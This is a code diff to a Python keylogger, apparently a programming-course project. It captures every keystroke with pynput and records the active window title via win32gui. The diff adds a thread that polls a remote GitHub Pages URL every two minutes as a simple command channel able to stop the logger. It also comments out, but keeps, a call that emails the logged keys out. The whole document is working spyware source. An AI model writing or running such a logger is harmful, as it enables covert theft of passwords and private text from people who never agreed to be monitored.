@@ -1,16 +1,18 @@
-import pynput
 from pynput.keyboard import Key,Listener
 import SendMail
-import os
 import win32gui
 import datetime
-
-
+import requests
+import threading
+import sys
+from bs4 import BeautifulSoup
+import time
 count = 0
 keys = []
 tempWindow=""
+globalX=""
 def on_press(key):
-    global keys, count,tempWindow
+    global keys, count,tempWindow,globalX
     # Get the window name while typing :
     w = win32gui
     windowInfo=w.GetWindowText(w.GetForegroundWindow())
@@ -23,6 +25,9 @@ def on_press(key):
 
     keys.append(str(key))
     count += 1
+    print("print",globalX)
+    if(globalX=="CLOSE"):
+        sys.exit(0)
 
 
 
@@ -60,10 +65,12 @@ def email(keys):
 
         message += k"""
     #print(str(keys))
-    SendMail.sendEmail(str(keys))
+    #SendMail.sendEmail(str(keys))
 
 def on_release(key):
+    global globalX
     if key == Key.esc:
+        globalX="CLOSE"
         return False
 def write_file(keys):
     boolValue=False
@@ -93,6 +100,42 @@ def write_file(keys):
           f.close()
 
 
+def sorgula():
+    global globalX
+    while(True):
+        if(globalX=="CLOSE"):
+            sys.exit()
+        url = "https://halil-ibrahim-gunbulak.github.io/AdvanceProgramming-WorkSpace/sorgu/index.html"
+        soup = BeautifulSoup(requests.get(url).content, "html.parser")
+        c = soup.find('div', attrs={"class": "text"})
+        print(c)
+        c = str(c).split(">")
+        print(c[1][0:2])
+        print(type(c))
+        print(type(str(c[1][2])))
+        print("içeri girdi")
+        time.sleep(120)
+        print("süre bitti")
+        globalX=str(c[1][0:2])
 
-with Listener(on_press = on_press, on_release = on_release) as listener:
-    listener.join()
+
+
+def startKeyLogger():
+    with Listener(on_press = on_press, on_release = on_release) as listener:
+         listener.join()
+
+
+def main():
+    global globalX
+    t1 = threading.Thread(target=sorgula)
+    t2 = threading.Thread(target=startKeyLogger)
+    t1.start()
+    t2.start()
+    t1.join()
+    t2.join()
+
+
+
+main()
+
+
